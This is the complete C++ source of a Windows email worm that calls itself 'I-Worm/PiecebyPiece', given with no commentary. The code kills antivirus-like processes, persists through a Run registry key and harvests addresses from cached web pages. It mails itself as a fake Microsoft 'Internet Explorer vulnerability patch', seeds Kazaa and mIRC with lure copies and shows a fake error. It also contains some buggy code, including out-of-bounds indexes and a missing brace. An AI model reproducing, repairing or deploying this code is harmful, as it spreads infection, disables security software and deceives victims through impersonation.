
#include <winsock.h>
#include <fstream.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>



HWND hwnd;
WORD version = MAKEWORD(1,1);
WSADATA wsaData;
int nRet;
char Buf[256],myBuf[256],ch[1],ch2[256],server[]="smtp.barrysworld.com",email[]="john@barrysworld.com",helo[]="barrysworld.com";
char emails[50][100],windir[MAX_PATH],filename[MAX_PATH],winbkup[MAX_PATH],zippth[MAX_PATH];
char cx[1],cx2[33],buc1[8],buc2[8],buc3[8],xxx[256];
SOCKET theSocket;
int i,err=0,c=0,connected=0,tim,sending=0;
SYSTEMTIME time;
double k;
DWORD basesize,ProcessId;



LRESULT CALLBACK WndProc(HWND hWnd,UINT iMsg,WPARAM wParam,LPARAM lParam);



int getasc(char chr[1]) {
int i=0;
char c[1];

for (i=0;i<257;i++) {
c[0]=i;
if (chr[0]==c[0]) { return(i); }
}
}


void base64(char *file) {
WIN32_FIND_DATA fis;
int i,j,n,done=0,k=0,lin=0;
double c=0;
char tmp[7];
DWORD totsize;
char base[64]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',

    'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',

    'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',

    'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'};

fstream f(file,ios::in | ios::binary), g("C:\\Msbootlog.sys",ios::out);
FindFirstFile(file,&fis);
totsize=fis.nFileSizeLow;
for (c=0;c<totsize/3;c++) {

buc1[0]=0;
xxx[0]=0;
f.get(cx[1]);
j=getasc(&cx[1]);
itoa(j,cx2,2);
if (strlen(cx2)<8) {
for (i=0;i<8-strlen(cx2);i++) buc1[i]='0';
buc1[i]=0;
strcat(buc1,cx2);
} else strcpy(buc1,cx2);
buc2[0]=0;
f.get(cx[1]);
j=getasc(&cx[1]);
itoa(j,cx2,2);
if (strlen(cx2)<8) {
for (i=0;i<8-strlen(cx2);i++) buc2[i]='0';
buc2[i]=0;
strcat(buc2,cx2);
} else strcpy(buc2,cx2);
buc3[0]=0;
f.get(cx[1]);
j=getasc(&cx[1]);
itoa(j,cx2,2);
if (strlen(cx2)<8) {
for (i=0;i<8-strlen(cx2);i++) buc3[i]='0';
buc3[i]=0;
strcat(buc3,cx2);
} else strcpy(buc3,cx2);
xxx[0]=0;
strcpy(xxx,buc1);
done=0;
k=0;
while (done!=24) {
	for (i=done;i<done+6;i++) {
	tmp[k]=xxx[i];
	k++;
	}
tmp[k]=0;
done+=6;
n=strtol(tmp,NULL,2);
g<<base[n];
lin++;
if (lin==76) {
	g<<endl;lin=0;
}
tmp[0]=0;
k=0;
}

}


if (totsize%3==1) {
buc1[0]=0;
f.get(cx[1]);
j=getasc(&cx[1]);
itoa(j,cx2,2);
if (strlen(cx2)<8) {
for (i=0;i<8-strlen(cx2);i++) buc1[i]='0';
buc1[i]=0;
strcat(buc1,cx2);
} else strcpy(buc1,cx2);
strcat(buc1,"0000");
done=0;
k=0;
while (done!=12) {
	for (i=done;i<done+6;i++) {
	tmp[k]=buc1[i];
	k++;
	}
tmp[k]=0;
done+=6;
n=strtol(tmp,NULL,2);
g<<base[n];
lin++;
if (lin==76) {
	g<<endl;lin=0;
}
tmp[0]=0;
k=0;
}
g<<"==";
}


if (totsize%3==2) {
buc1[0]=0;
f.get(cx[1]);
j=getasc(&cx[1]);
itoa(j,cx2,2);
if (strlen(cx2)<8) {
for (i=0;i<8-strlen(cx2);i++) buc1[i]='0';
buc1[i]=0;
strcat(buc1,cx2);
} else strcpy(buc1,cx2);
strcat(buc1,"00");
done=0;
k=0;
while (done!=18) {
	for (i=done;i<done+6;i++) {
	tmp[k]=buc1[i];
	k++;
	}
tmp[k]=0;
done+=6;
n=strtol(tmp,NULL,2);
g<<base[n];
lin++;
if (lin==76) {
	g<<endl;lin=0;
}
tmp[0]=0;
k=0;
}
g<<"=";
}

f.close();
g.close();

FindFirstFile("C:\\Msbootlog.sys",&fis);
basesize=fis.nFileSizeLow;
}


void sendmail() {
int ran;

sending=1;

strcpy(myBuf, "HELO <");
strcat(myBuf,helo);
strcat(myBuf,">\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

recv(theSocket,Buf,sizeof(Buf),0);

if (Buf[0]=='2' && Buf[1]=='5' && Buf[2]=='0') {
strcpy(myBuf, "MAIL FROM:<");
strcat(myBuf,email);
strcat(myBuf,">\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

recv(theSocket,Buf,sizeof(Buf),0);
}
if (Buf[0]=='4' || Buf[0]=='5') err=1;

if (Buf[0]=='2' && Buf[1]=='5' && Buf[2]=='0' && err==0) {

GetSystemTime(&time);
srand(time.wSecond);
ran=rand();
while (ran>c) {
srand(c);
ran=ran-rand();
}
if (ran<0) ran=ran*(-1);
strcpy(myBuf, "RCPT TO:<");
strcat(myBuf, emails[ran]);
strcat(myBuf, ">\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

recv(theSocket,Buf,sizeof(Buf),0);
}
if (Buf[0]=='4' || Buf[0]=='5') err=1;

if (Buf[0]=='2' && Buf[1]=='5' && err==0) {
strcpy(myBuf, "DATA\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

recv(theSocket,Buf,sizeof(Buf),0);
}
if (Buf[0]=='4' || Buf[0]=='5') err=1;

if (Buf[0]=='3' && Buf[1]=='5' && Buf[2]=='4' && err==0) {

if (stricmp(email,"john@barrysworld.com")==0) {
	strcpy(myBuf, "Reply-To: \"Microsoft\" <microsoft@microsoft.com>\x0d\x0a");
	send(theSocket,myBuf,strlen(myBuf),0);

	strcpy(myBuf, "From: \"Microsoft\" <information@microsoft.com>\x0d\x0a");
	send(theSocket,myBuf,strlen(myBuf),0);

	strcpy(myBuf, "Subject: Internet Explorer vulnerability patch\x0d\x0a");
	send(theSocket,myBuf,strlen(myBuf),0);
} else {
	strcpy(myBuf, "From: <");
	strcat(myBuf, email);
	strcat(myBuf, ">\x0d\x0a");
	send(theSocket,myBuf,strlen(myBuf),0);

	strcpy(myBuf, "Subject: Hello\x0d\x0a");
	send(theSocket,myBuf,strlen(myBuf),0);

}

strcpy(myBuf, "MIME-Version: 1.0\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "Content-Type: multipart/mixed;\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "    boundary = \"bla\"\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "X-Priority: 3\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "X -MSMail - Priority: Normal\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "X-Mailer: mailer@localhost\x0d\x0a\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "This is a multi-part message in MIME format.\x0d\x0a\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "--bla\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "Content-Type: text/plain; charset:us-ascii\x0d\x0a\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "You will find all you need in the attachment.\x0d\x0a\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "--bla\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "Content-Type: application/x-msdownload;\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "    name = \"setup.exe\"\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "Content-Transfer-Encoding: base64\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "Content-Disposition: attachment;\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "    filename = \"setup.exe\"\x0d\x0a\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);


fstream f("C:\\Msbootlog.sys",ios::in);
for (k=0;k<basesize;k++) {
f.get(ch[1]);
strcpy(myBuf,&ch[1]);
send(theSocket,myBuf,strlen(myBuf),0);
}
f.close();

strcpy(myBuf, "\x0d\x0a--bla--\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

strcpy(myBuf, "\x0d\x0a.\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);

recv(theSocket,Buf,sizeof(Buf),0);
}
if (Buf[0]=='4' || Buf[0]=='5') err=1;

strcpy(myBuf, "QUIT\x0d\x0a");
send(theSocket,myBuf,strlen(myBuf),0);
}


BOOL GetProcessModule (DWORD dwPID, DWORD dwModuleID,
     LPMODULEENTRY32 lpMe32, DWORD cbMe32)
{
    BOOL          bRet        = FALSE;
    BOOL          bFound      = FALSE;
    HANDLE        hModuleSnap = NULL;
    MODULEENTRY32 me32        = {0};

    hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
    if (hModuleSnap == (HANDLE)-1)
        return (FALSE);

    me32.dwSize = sizeof(MODULEENTRY32);

   if (Module32First(hModuleSnap, &me32))
    {
        do
        {
            if (me32.th32ModuleID == dwModuleID)
            {
                CopyMemory (lpMe32, &me32, cbMe32);
                bFound = TRUE;
            }
        }
        while (!bFound && Module32Next(hModuleSnap, &me32));

        bRet = bFound;
    }
    else
        bRet = FALSE;
    CloseHandle (hModuleSnap);

    return (bRet);
}



BOOL processes()
{
    HANDLE         hProcessSnap = NULL;
    BOOL           bRet      = FALSE;
    PROCESSENTRY32 pe32      = {0};

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == (HANDLE)-1)
        return (FALSE);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32))
    {
        DWORD         dwPriorityClass;
        BOOL          bGotModule = FALSE;
        MODULEENTRY32 me32       = {0};
        do
        {
            bGotModule = GetProcessModule(pe32.th32ProcessID,
                pe32.th32ModuleID, &me32, sizeof(MODULEENTRY32));
            if (bGotModule)
            {
                HANDLE hProcess;
                hProcess = OpenProcess (PROCESS_ALL_ACCESS,
                    FALSE, pe32.th32ProcessID);
                dwPriorityClass = GetPriorityClass (hProcess);

				if (me32.th32ProcessID==ProcessId) strcpy(filename,me32.szExePath);


				if (strstr(me32.szModule,"AV")!=0 || strstr(me32.szModule,"F-")!=0 || strstr(me32.szModule,"av")!=0) {
					TerminateProcess(hProcess,0);
					}


				CloseHandle (hProcess);
            }
        }
        while (Process32Next(hProcessSnap, &pe32));
        bRet = TRUE;
    }
    else
        bRet = FALSE;
    CloseHandle (hProcessSnap);
    return (bRet);
}


void findserver() {
int i,j;
char key2[256];
unsigned char acc[1024],smtp[1024],eml[1024];
DWORD acclen=sizeof(acc), smtplen=sizeof(smtp), emllen=sizeof(eml);
HKEY hKey;


strcpy(key2,"Software\\Microsoft\\Internet Account Manager");
RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"Default Mail Account",0,NULL,acc,&acclen);
RegCloseKey(hKey);
strcpy(key2,"Software\\Microsoft\\Internet Account Manager\\Accounts\\");
j=strlen(key2);
for (i=0;i<8;i++){
key2[j+i]=acc[i];
}
key2[j+i]=0;
RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"SMTP Server",0,NULL,smtp,&smtplen);
RegCloseKey(hKey);
if (smtp[0]>44 && smtp[0]<123) {
i=0;
while (smtp[i]!=0) {
	server[i]=smtp[i];
	i++;
	}
server[i]=0;

RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"SMTP Email Address",0,NULL,eml,&emllen);
RegCloseKey(hKey);
if (eml[0]>44 && eml[0]<123) {
i=0;
while (eml[i]!=0) {
	email[i]=eml[i];
	i++;
	}
email[i]=0;
}

i=strlen(email)-1;
j=0;
while (email[i]!='@') {
	helo[j]=email[i];
	j++;
	i--;
	}
}
helo[j]=0;
strrev(helo);

}



void findmail(char file[MAX_PATH])
{
int ik,j=0;
char lin[256],*start,ch[1];

fstream f(file,ios::in);
while (f.get(lin,256))
{
start=strstr(lin,"mailto:");
if (start!=0)
 {
 j=0;
 c++;
 ik=start-lin+7;
 ch[1]=lin[ik];
 while (ch[1]!=34 && ch[1]!=58 && ch[1]!=32 && ch[1]!=62 && ch[1]!=63)
  {
  emails[c][j]=ch[1];
  j++;
  ik++;
  ch[1]=lin[ik];
  }
emails[c][j]=0;
}
f.get();
}
f.close();
}



void findfiles() {
WIN32_FIND_DATA f;
HANDLE hf;
int k=0;
char pth1[MAX_PATH],pth2[MAX_PATH],pth3[MAX_PATH],pth[MAX_PATH],path[MAX_PATH];

strcpy(pth2,windir);
strcat(pth2,"\\Temporary Internet Files\\*");
hf=FindFirstFile(pth2,&f);
if (f.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) {strcpy(pth1,f.cFileName); k=20;}
while (FindNextFile(hf,&f)!=0 && k<20) {
	if (f.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) {strcpy(pth1,f.cFileName); k=20;}
	k++;
}
FindClose(hf);
strcpy(pth2,windir);
strcat(pth2,"\\Temporary Internet Files\\");
strcat(pth2,pth1);
strcat(pth2,"\\*");
k=0;
hf=FindFirstFile(pth2,&f);
if (f.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) {strcpy(pth3,f.cFileName); k=20;}
while (FindNextFile(hf,&f)!=0 && k<20) {
	if (f.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) {strcpy(pth3,f.cFileName); k=20;}
	k++;
}
FindClose(hf);
strcpy(pth2,windir);
strcat(pth2,"\\Temporary Internet Files\\");
strcat(pth2,pth1);
strcat(pth2,"\\");
strcat(pth2,pth3);
strcpy(pth,pth2);
strcat(pth,"\\");
strcat(pth2,"\\*.htm");
k=0;
hf=FindFirstFile(pth2,&f);
while (FindNextFile(hf,&f)!=0 && k<70) {
	if (f.cFileName[0]!='.') {
		strcpy(path,pth);
		strcat(path,f.cFileName);
		findmail(path);
	}
	k++;
}
FindClose(hf);
}



int conect() {


i=WSAStartup(version, &wsaData);
if (i!=0) {return(0);}


LPHOSTENT lpHostEntry;

lpHostEntry = gethostbyname(server);
if (lpHostEntry == NULL) {
WSACleanup();
connected=0;
return(0);
} else connected=1;

if (err==0) {
	findserver();
	findfiles();
}

theSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (theSocket == INVALID_SOCKET) {
WSACleanup();
connected=0;
return(0);
}

SOCKADDR_IN saServer;
saServer.sin_family = AF_INET;
saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
saServer.sin_port = htons(25);

nRet = connect(theSocket,(LPSOCKADDR)&saServer,sizeof(struct sockaddr));
if (nRet == SOCKET_ERROR) {
WSACleanup();
connected=0;
return(0);
}

nRet = recv(theSocket,Buf,sizeof(Buf),0);
if (nRet == SOCKET_ERROR) {
WSACleanup();
connected=0;
return(0);
}

if (Buf[0]=='4' || Buf[0]=='5') err=1;
if (Buf[0]=='2' && Buf[1]=='2' && Buf[2]=='0') {
sendmail();
}

closesocket(theSocket);

WSACleanup();
}



void kazaa(char *file) {
int i;
char kaza[256],kfile[3][20];
unsigned char kpth[1024];
DWORD kpthlen=sizeof(kpth);
HKEY hKey;


strcpy(kfile[0],"\\mirc6.exe");
strcpy(kfile[1],"\\winamp3.exe");
strcpy(kfile[2],"\\wincrack.exe");
strcpy(kfile[3],"\\icq2002.exe");

RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Kazaa\\Transfer",0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"DlDir0",0,NULL,kpth,&kpthlen);
RegCloseKey(hKey);
if (kpth[0]>64 && kpth[0]<123) {
i=0;
while (kpth[i]!=0) {
	kaza[i]=kpth[i];
	i++;
	}
kaza[i]=0;
}
GetSystemTime(&time);
srand(time.wSecond);
if (rand()%5==0) strcat(kaza,kfile[3]);
 else if (rand()%4==0) strcat(kaza,kfile[2]);
  else if (rand()%3==0) strcat(kaza,kfile[1]);
   else if (rand()%2==0) strcat(kaza,kfile[0]);
CopyFile(file,kaza,FALSE);
}



void infectwin(char *file) {
HKEY hKey;
unsigned char val[256];
char rnd[6];
int i=0;

strcpy(winbkup,windir);
strcat(winbkup,"\\System\\winsys");
GetSystemTime(&time);
srand(time.wSecond);
itoa(rand(),rnd,10);
strcat(winbkup,rnd);
strcat(winbkup,".exe");

CopyFile(file,winbkup,TRUE);

strcpy(zippth,winbkup);

while (winbkup[i]!=0) {
	val[i]=winbkup[i];
	i++;
	}
val[i]=0;
RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
RegSetValueEx(hKey,"Windows task32 sys",0,REG_SZ,val,sizeof(val));
RegCloseKey(hKey);
}



void mirc() {
HKEY hKey;
unsigned char mircpth[1024];
char mirc[MAX_PATH];
int i=0;
DWORD mircpthlen=sizeof(mircpth);


RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC",0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"UninstallString",0,NULL,mircpth,&mircpthlen);
RegCloseKey(hKey);
i=1;
while (mircpth[i]!=0 && mircpth[i]!='.') {
	mirc[i-1]=mircpth[i];
	i++;
	}
mirc[i-1]=0;
i=strlen(mirc);
while (mirc[i]!=92) {
	mirc[i]=0;
	i--;
	}
strcat(mirc,"script.ini");

fstream f(mirc,ios::out);
f<<"[Script]"<<endl;
f<<"n0=ON 1:JOIN:#:{"<<endl;
f<<"n1=/dcc send $nick "<<zippth<<endl;
f<<"n2=}"<<endl;
f<<"n3=on 1:start:{"<<endl;
f<<"n4= /join #piecebypiece"<<endl;
f<<"n5=}"<<endl;
f.close();

}



void zipit(char *file) {
HKEY hKey;
unsigned char zip[1024];
char zippath[MAX_PATH],param[MAX_PATH],rnd[6];
int i=0;
DWORD ziplen=sizeof(zip);
i=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winzip32.exe",0,KEY_QUERY_VALUE,&hKey);
if (i==ERROR_SUCCESS) {
RegQueryValueEx(hKey,"",0,NULL,zip,&ziplen);
RegCloseKey(hKey);
i=0;
while (zip[i]!=0) {
	zippath[i]=zip[i];
	i++;
	}
zippath[i]=0;

strcpy(zippth,windir);
strcat(zippth,"\\System\\win32sys");
GetSystemTime(&time);
srand(time.wSecond);
itoa(rand(),rnd,10);
strcat(zippth,rnd);
strcat(zippth,".zip");

strcpy(param," -a -r ");
strcat(param,zippth);
strcat(param," ");
strcat(param,file);
ShellExecute(hwnd,"open",zippath,param,NULL,SW_HIDE);
} else strcpy(zippth,file);

}

VOID CALLBACK TimerProc(HWND hwnd,UINT uMsg,UINT idEvent,DWORD dwTime) {

if (sending==0) {
	conect();
	if (err!=0) {
		strcpy(server,"smtp.barrysworld.com");
		strcpy(email,"john@barrysworld.com");
		strcpy(helo,"barrysworld.com");
		conect();
		}
	if (connected==1) KillTimer(hwnd,tim);
}


void payload() {
MessageBox(NULL,"\"Cause nothing ever lasts forever\nWe're like flowers in this vase, together\nYou and me, it's pulling me down\nTearing my down, piece by piece\nAnd you can't see\nThat's it's like a disease\nKilling me now, it's so hard to breathe\"\n\t-Feeder <Piece by Piece>","I-Worm/PiecebyPiece",MB_OK+MB_SYSTEMMODAL);
}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd){
WNDCLASSEX wndc;
MSG msg;
HKEY hKey;
unsigned char buf[1024],inf[]="yes";
DWORD buflen=sizeof(buf);
int first=0;


wndc.cbClsExtra = 0;
wndc.cbSize = sizeof(wndc);
wndc.cbWndExtra = 0;
wndc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
wndc.hCursor = LoadCursor(NULL,IDC_ARROW);
wndc.hIcon = LoadIcon(NULL,IDI_APPLICATION);
wndc.hIconSm = LoadIcon(NULL,IDI_APPLICATION);
wndc.hInstance = hInstance;
wndc.lpfnWndProc = WndProc;
wndc.lpszClassName = "ClassName";
wndc.lpszMenuName = NULL;
wndc.style = CS_HREDRAW|CS_VREDRAW;
RegisterClassEx(&wndc);
hwnd =CreateWindow("ClassName","NEWWIN",WS_POPUPWINDOW,0,0,1024,1024,NULL,NULL,hInstance,NULL);
UpdateWindow(hwnd);

ShowWindow(hwnd,SW_HIDE);

GetWindowThreadProcessId(hwnd,&ProcessId);
processes();
GetWindowsDirectory (windir, sizeof (windir));

RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\RedCell",0,KEY_QUERY_VALUE,&hKey);
RegQueryValueEx(hKey,"infected",0,NULL,buf,&buflen);
RegCloseKey(hKey);
if (buf[0]!='y' || buf[1]!='e' || buf[2]!='s')
{
RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\RedCell",&hKey);

RegSetValueEx(hKey,"infected",0,REG_SZ,inf,sizeof(inf));
RegCloseKey(hKey);

infectwin(filename);
kazaa(filename);
zipit(winbkup);
mirc();
base64(filename);
conect();
first=1;
MessageBox(hwnd,"This program has performed an illegal operation","Error",MB_OK+MB_ICONSTOP);
}
base64(filename);
GetSystemTime(&time);
if (time.wDay==15 && time.wMonth==9) payload();
if (first==0) {
	base64(filename);
	conect();
	if (err!=0) {
		strcpy(server,"smtp.barrysworld.com");
		strcpy(email,"john@barrysworld.com");
		strcpy(helo,"barrysworld.com");
		conect();
		}
}
if (connected==0) SetTimer(hwnd,tim,50000,TimerProc);

while(GetMessage(&msg,NULL,0,0)) {
	TranslateMessage(&msg);
	DispatchMessage(&msg);
}
return msg.wParam;

}


LRESULT CALLBACK WndProc(HWND hwnd,UINT iMsg,WPARAM wParam,LPARAM lParam) {
	HDC hdc;
	PAINTSTRUCT ps;

	switch(iMsg){
	case WM_PAINT:
		hdc = BeginPaint(hwnd,&ps);
		EndPaint(hwnd,&ps);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hwnd,iMsg,wParam,lParam);
}
